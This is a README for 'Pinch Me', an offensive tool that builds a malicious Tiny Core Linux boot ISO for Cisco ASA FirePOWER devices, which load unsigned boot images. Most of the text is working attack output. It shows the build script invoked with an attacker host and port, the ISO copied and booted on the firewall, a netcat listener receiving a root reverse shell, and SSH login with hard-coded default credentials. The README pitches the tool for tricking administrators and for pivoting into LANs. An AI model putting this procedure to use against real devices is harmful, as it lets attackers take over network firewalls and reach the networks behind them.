# Pinch Me

Pinch Me generates a bootable [Tiny Core Linux](http://tinycorelinux.net/) ISO. The ISO can be loaded and executed as a virtual machine on [Cisco ASA-X with FirePOWER Services](https://www.cisco.com/c/en/us/products/security/asa-firepower-services/index.html). Too install [FirePOWER Services Software for ASA](https://software.cisco.com/download/home/286283326/type/286277393/release/6.2.3) the administrator must first load a boot image (e.g. `asasfr-5500x-boot-6.2.3-4.img`). ASA software has no mechanism to determine if the provided boot image was provided by Cisco, and because the boot image is simply a bootable ISO, any arbitrary boot image will get loaded/executed.

`pinchme.sh` will generate an image that includes ASCII DOOM, a reverse shell on start up, and an SSH server. The default credentials are `tc:ch33sed00dle`. The VM will gain execution on the administrative interface that the FirePOWER Services would typically occupy. Depending on wiring (e.g. if the admin interface is wired as recommended by Cisco), the VM will be assigned two NIC. One NIC will be assigned a DHCP address allowing the attacker to both access the internet and the LAN (of course, depending on firewall rules). It serves as an excellent pivot.

However, the boot image is not permenant. If the ASA is restarted then the boot image is cleared away. Obviously, this could be seen as good or bad depending on the attack scenario.

This is most likely useful when tricking a user to install the malicious boot image. It's also useful if an attacker achieves administrative access to the ASA that isn't running an SFR module (or the attacker is willing to wipe out the current SFR installation). 

## Example

### Generating the Image (reverse shell to 10.0.0.28:1270)

```sh
albinolobster@ubuntu:~/pinchme$ sudo ./pinchme.sh -i 10.0.0.28 -p 1270
LHOST: 10.0.0.28
LPORT: 1270
/home/albinolobster/pinchme/iso.fkfpCd
--2022-06-13 07:56:18--  https://distro.ibiblio.org/tinycorelinux/6.x/x86/release/Core-6.4.1.iso
Resolving distro.ibiblio.org (distro.ibiblio.org)... 152.19.134.43
Connecting to distro.ibiblio.org (distro.ibiblio.org)|152.19.134.43|:443... connected.

... snip the download of many Tiny Core files ...

/home/albinolobster/pinchme/iso.fkfpCd/cde/optional /home/albinolobster/pinchme
/home/albinolobster/pinchme
xorriso 1.5.2 : RockRidge filesystem manipulator, libburnia project.

Drive current: -outdev 'stdio:tinycore-custom.iso'
Media current: stdio file, overwriteable
Media status : is blank
Media summary: 0 sessions, 0 data blocks, 0 data, 61.9g free
xorriso : WARNING : -volid text does not comply to ISO 9660 / ECMA 119 rules
Added to ISO image: directory '/'='/home/albinolobster/pinchme/iso.fkfpCd'
xorriso : UPDATE :      51 files added in 1 seconds
xorriso : UPDATE :      51 files added in 1 seconds
ISO image produced: 32815 sectors
Written to medium : 32815 sectors at LBA 0
Writing to 'stdio:tinycore-custom.iso' completed successfully.

19345 blocks
Cloning into 'doom-ascii'...
remote: Enumerating objects: 338, done.
remote: Counting objects: 100% (338/338), done.
remote: Compressing objects: 100% (210/210), done.
remote: Total 338 (delta 151), reused 313 (delta 126), pack-reused 0
Receiving objects: 100% (338/338), 3.31 MiB | 6.30 MiB/s, done.
Resolving deltas: 100% (151/151), done.
--2022-06-13 07:56:44--  https://archive.org/download/2020_03_22_DOOM/DOOM%20WADs/Doom%20%28v1.9%29.zip
Resolving archive.org (archive.org)... 207.241.224.2
Connecting to archive.org (archive.org)|207.241.224.2|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://ia801900.us.archive.org/28/items/2020_03_22_DOOM/DOOM%20WADs/Doom%20%28v1.9%29.zip [following]
--2022-06-13 07:56:44--  https://ia801900.us.archive.org/28/items/2020_03_22_DOOM/DOOM%20WADs/Doom%20%28v1.9%29.zip
Resolving ia801900.us.archive.org (ia801900.us.archive.org)... 207.241.228.100
Connecting to ia801900.us.archive.org (ia801900.us.archive.org)|207.241.228.100|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4808638 (4.6M) [application/zip]
Saving to: ‘Doom (v1.9).zip’

Doom (v1.9).zip                                    100%[===============================================================================================================>]   4.58M   493KB/s    in 10s     

2022-06-13 07:56:55 (468 KB/s) - ‘Doom (v1.9).zip’ saved [4808638/4808638]

39399 blocks
    15949588    15583615  97% core.gz
    15949588    15583615  97%
I: -input-charset not specified, using utf-8 (detected in locale settings)
Size of boot image is 4 sectors -> No emulation
 13.44% done, estimate finish Mon Jun 13 07:57:23 2022
 26.89% done, estimate finish Mon Jun 13 07:57:23 2022
 40.32% done, estimate finish Mon Jun 13 07:57:23 2022
 53.76% done, estimate finish Mon Jun 13 07:57:23 2022
 67.22% done, estimate finish Mon Jun 13 07:57:23 2022
 80.67% done, estimate finish Mon Jun 13 07:57:23 2022
 94.10% done, estimate finish Mon Jun 13 07:57:23 2022
Total translation table size: 2048
Total rockridge attributes bytes: 4909
Total directory bytes: 12288
Path table size(bytes): 66
Max brk space used 23000
37204 extents written (72 MB)
```

### Loading the Image

```
albinolobster@ubuntu:~/pinchme$ ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 albinolobster@10.0.0.21
albinolobster@10.0.0.21's password: 
User albinolobster logged in to ciscoasa
Logins over the last 5 days: 42.  Last login: 23:41:56 UTC Jun 10 2022 from 10.0.0.28
Failed logins since the last login: 0.  Last failed login: 23:41:54 UTC Jun 10 2022 from 10.0.0.28
Type help or '?' for a list of available commands.
ciscoasa> en
Password: 
ciscoasa# copy http://10.0.0.28/tinycore-custom.iso disk0:/tinycore-custom.iso

Address or name of remote host [10.0.0.28]? 

Source filename [tinycore-custom.iso]? 

Destination filename [tinycore-custom.iso]? 

Accessing http://10.0.0.28/tinycore-custom.iso...!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Writing file disk0:/tinycore-custom.iso...
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
INFO: No digital signature found
76193792 bytes copied in 18.440 secs (4232988 bytes/sec)

ciscoasa# sw-module module sfr recover configure image disk0:/tinycore-custom.iso
ciscoasa# debug module-boot
debug module-boot  enabled at level 1
ciscoasa# sw-module module sfr recover boot

Module sfr will be recovered. This may erase all configuration and all data
on that device and attempt to download/install a new image for it. This may take
several minutes.

Recover module sfr? [confirm]
Recover issued for module sfr.
ciscoasa# Mod-sfr 177> ***
Mod-sfr 178> *** EVENT: Creating the Disk Image...
Mod-sfr 179> *** TIME: 15:12:04 UTC Jun 13 2022
Mod-sfr 180> ***
Mod-sfr 181> ***
Mod-sfr 182> *** EVENT: The module is being recovered.
Mod-sfr 183> *** TIME: 15:12:04 UTC Jun 13 2022
Mod-sfr 184> ***
Mod-sfr 185> ***
Mod-sfr 186> *** EVENT: Disk Image created successfully.
Mod-sfr 187> *** TIME: 15:13:42 UTC Jun 13 2022
Mod-sfr 188> ***
Mod-sfr 189> ***
Mod-sfr 190> *** EVENT: Start Parameters: Image: /mnt/disk0/vm/vm_1.img, ISO: -cdrom /mnt/disk0
Mod-sfr 191> /tinycore-custom.iso, Num CPUs: 3, RAM: 2249MB, Mgmt MAC: 00:FC:BA:44:54:31, CP MA
Mod-sfr 192> C: 00:00:00:02:00:01, HDD: -drive file=/dev/sda,cache=none,if=virtio, Dev Driver: 
Mod-sfr 193> vir
Mod-sfr 194> ***
Mod-sfr 195> *** EVENT: Start Parameters Continued: RegEx Shared Mem: 0MB, Cmd Op: r, Shared Me
Mod-sfr 196> m Key: 8061, Shared Mem Size: 16, Log Pipe: /dev/ttyS0_vm1, Sock: /dev/ttyS1_vm1, 
Mod-sfr 197> Mem-Path: -mem-path /hugepages
Mod-sfr 198> *** TIME: 15:13:42 UTC Jun 13 2022
Mod-sfr 199> ***
Mod-sfr 200> Status: Mapping host 0x2aab37e00000 to VM with size 16777216
Mod-sfr 201> Warning: vlan 0 is not connected to host network
```

## Examples Post-Exploitation

The following demonstrates what we get post-exploitation.

### Reverse Shell

```
albinolobster@ubuntu:~$ nc -lvnp 1270
Listening on 0.0.0.0 1270
Connection received on 10.0.0.21 60579
id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux box 3.16.6-tinycore #777 SMP Thu Oct 16 09:42:42 UTC 2014 i686 GNU/Linux
ifconfig
eth0      Link encap:Ethernet  HWaddr 00:00:00:02:00:01  
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:173 errors:0 dropped:164 overruns:0 frame:0
          TX packets:14 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:9378 (9.1 KiB)  TX bytes:4788 (4.6 KiB)

eth1      Link encap:Ethernet  HWaddr 00:FC:BA:44:54:31  
          inet addr:192.168.1.17  Bcast:192.168.1.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:14 errors:0 dropped:0 overruns:0 frame:0
          TX packets:11 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:1482 (1.4 KiB)  TX bytes:1269 (1.2 KiB)

eth2      Link encap:Ethernet  HWaddr 52:54:00:12:34:56  
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:14 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:4788 (4.6 KiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
```


### SSH Access

Note that the SSH server will only be accessible via the LAN (unless a hole is punched through the firewall).

```
albinolobster@ubuntu:~/pinchme$ ssh tc@192.168.1.17
The authenticity of host '192.168.1.17 (192.168.1.17)' can't be established.
ECDSA key fingerprint is SHA256:LyH94hlaD6/GBxzoe/kyuvSWc5Yvs62t8VrYwWHo0FM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.17' (ECDSA) to the list of known hosts.
tc@192.168.1.17's password: 
   ( '>')
  /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.
 (/-_--_-\)           www.tinycorelinux.net

tc@box:~$ id
uid=1001(tc) gid=50(staff) groups=50(staff)
tc@box:~$ ifconfig
eth0      Link encap:Ethernet  HWaddr 00:00:00:02:00:01  
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:332 errors:0 dropped:316 overruns:0 frame:0
          TX packets:32 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:17992 (17.5 KiB)  TX bytes:10944 (10.6 KiB)

eth1      Link encap:Ethernet  HWaddr 00:FC:BA:44:54:31  
          inet addr:192.168.1.17  Bcast:192.168.1.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:69 errors:0 dropped:0 overruns:0 frame:0
          TX packets:47 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:8575 (8.3 KiB)  TX bytes:7583 (7.4 KiB)

eth2      Link encap:Ethernet  HWaddr 52:54:00:12:34:56  
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:31 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:10602 (10.3 KiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

tc@box:~$ 
```

### ASCII DOOM

#### Compile

```
albinolobster@ubuntu:~/pinchme$ ssh tc@192.168.1.17
tc@192.168.1.17's password: 
   ( '>')
  /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.
 (/-_--_-\)           www.tinycorelinux.net

tc@box:~$ sudo su
root@box:/home/tc# cd /root/
root@box:~# unzip Doom\ \(v1.9\).zip 
Archive:  Doom (v1.9).zip
  inflating: DOOM.WAD
root@box:~# cd doom-ascii/src
root@box:~/doom-ascii/src# make
mkdir -p build
[Compiling i_main.c]
[Compiling dummy.c]
[Compiling am_map.c]
[Compiling doomdef.c]
[Compiling doomstat.c]
[Compiling dstrings.c]
[Compiling d_event.c]
[Compiling d_items.c]
[Compiling d_iwad.c]
[Compiling d_loop.c]
[Compiling d_main.c]
[Compiling d_mode.c]
[Compiling d_net.c]
[Compiling f_finale.c]
[Compiling f_wipe.c]
[Compiling g_game.c]
[Compiling hu_lib.c]
[Compiling hu_stuff.c]
[Compiling info.c]
[Compiling i_cdmus.c]
[Compiling i_endoom.c]
[Compiling i_joystick.c]
[Compiling i_scale.c]
[Compiling i_sound.c]
[Compiling i_system.c]
[Compiling i_timer.c]
[Compiling memio.c]
[Compiling m_argv.c]
[Compiling m_bbox.c]
[Compiling m_cheat.c]
[Compiling m_config.c]
[Compiling m_controls.c]
[Compiling m_fixed.c]
[Compiling m_menu.c]
[Compiling m_misc.c]
[Compiling m_random.c]
[Compiling p_ceilng.c]
[Compiling p_doors.c]
[Compiling p_enemy.c]
[Compiling p_floor.c]
[Compiling p_inter.c]
[Compiling p_lights.c]
[Compiling p_map.c]
[Compiling p_maputl.c]
[Compiling p_mobj.c]
[Compiling p_plats.c]
[Compiling p_pspr.c]
[Compiling p_saveg.c]
[Compiling p_setup.c]
[Compiling p_sight.c]
[Compiling p_spec.c]
[Compiling p_switch.c]
[Compiling p_telept.c]
[Compiling p_tick.c]
[Compiling p_user.c]
[Compiling r_bsp.c]
[Compiling r_data.c]
[Compiling r_draw.c]
[Compiling r_main.c]
[Compiling r_plane.c]
[Compiling r_segs.c]
[Compiling r_sky.c]
[Compiling r_things.c]
[Compiling sha1.c]
[Compiling sounds.c]
[Compiling statdump.c]
[Compiling st_lib.c]
[Compiling st_stuff.c]
[Compiling s_sound.c]
[Compiling tables.c]
[Compiling v_video.c]
[Compiling wi_stuff.c]
[Compiling w_checksum.c]
[Compiling w_file.c]
[Compiling w_main.c]
[Compiling w_wad.c]
w_wad.c: In function 'W_ReadLump':
w_wad.c:364:5: warning: implicit declaration of function 'I_EndRead' [-Wimplicit-function-declaration]
     I_EndRead ();
     ^
[Compiling z_zone.c]
[Compiling w_file_stdc.c]
[Compiling i_input.c]
[Compiling i_video.c]
[Compiling doomgeneric.c]
[Compiling doomgeneric_ascii.c]
mkdir -p ../doom_ascii
[Linking ../doom_ascii/doom_ascii]
[Size]
size ../doom_ascii/doom_ascii
   text	   data	    bss	    dec	    hex	filename
 245950	  60948	 245572	 552470	  86e16	../doom_ascii/doom_ascii
root@box:~/doom-ascii/src# 
```

#### Play

```
tc@box:~$ cd /root/doom-ascii/doom_ascii/
doom_ascii  doom_ascii.map
tc@box:/root/doom-ascii/doom_ascii$ ./doom_ascii -iwad ../../DOOM.WAD 
```

## Tested

This script was tested on Ubuntu 20.04.04. The generated ISO was tested on an ASA 5506-X with FirePOWER Services.

## Credit

* [Dan Krause](https://gist.github.com/dankrause) for their [custom-tiny-core.sh gist](https://gist.github.com/dankrause/2a9ed5ed30fa7f9aaaa2) from which this script was forked.
* [Into the Core](http://tinycorelinux.net/corebook.pdf) by Lauri Kasanen et al for their lovely guide on unpacking and repacking the filesystem/ISO.
* [Bare Naked Ladies](https://www.youtube.com/watch?v=u3NE6UuaLiY)

